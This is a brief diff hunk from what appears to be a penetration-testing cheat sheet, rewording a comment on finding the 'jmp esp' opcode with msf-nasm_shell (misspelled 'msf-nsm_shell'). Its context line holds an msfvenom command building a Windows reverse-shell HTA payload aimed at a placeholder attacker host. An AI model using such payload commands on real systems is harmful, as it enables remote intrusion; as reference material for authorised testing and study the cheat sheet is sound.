@@ -1669,7 +1669,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-p
 
 ## MSF-NASM_SHELL
 ```bash
-# jump to ESP in hex
+# find opcode for jump to ESP
 msf-nsm_shell
 jmp esp
 ```
